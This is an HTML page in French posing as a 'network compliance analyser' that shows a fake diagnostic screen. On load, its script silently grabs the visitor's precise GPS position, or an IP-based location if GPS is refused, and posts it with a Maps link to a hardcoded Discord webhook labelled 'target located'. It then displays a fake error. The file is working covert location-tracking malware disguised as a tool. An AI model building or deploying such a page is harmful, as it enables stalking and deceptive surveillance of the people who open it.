<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Analyseur de Conformit√© R√©seau</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #30363d; padding: 20px; background: #161b22; border-radius: 5px; text-align: center; width: 80%; max-width: 400px; }
    </style>
</head>
<body>

<div class="box">
    <h2>DIAGNOSTIC EN COURS...</h2>
    <p id="status">Initialisation du tunnel s√©curis√©...</p>
</div>

<script>
// --- CONFIGURATION ---
const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";

async function sendToDiscord(mapLink, details, lat, lon) {
    const payload = {
        embeds: [{
            title: "üéØ CIBLE LOCALIS√âE - PR√âCISION GPS",
            color: 15158332,
            fields: [
                { name: "üìç Google Maps", value: `[Cliquer ici pour voir la rue](${mapLink})` },
                { name: "üìä D√©tails", value: details, inline: true },
                { name: "üåç Coordonn√©es", value: `${lat}, ${lon}`, inline: true }
            ],
            footer: { text: "Syst√®me de Tra√ßage OSINT v2.5" }
        }]
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

async function gatherData() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            await sendToDiscord(gpsLink, `Pr√©cision: ${accuracy} m√®tres`, lat, lon);
            document.getElementById('status').innerText = "V√©rification termin√©e.";
        }, async (error) => {
            // Repli sur IP si refus
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
            await sendToDiscord("GPS Refus√©", "Bas√© sur IP", ipData.latitude, ipData.longitude);
            document.getElementById('status').innerText = "Erreur de synchro 0x882.";
        }, { enableHighAccuracy: true, timeout: 10000 });
    }
}

// Lancement
gatherData();
</script>
</body>
</html>
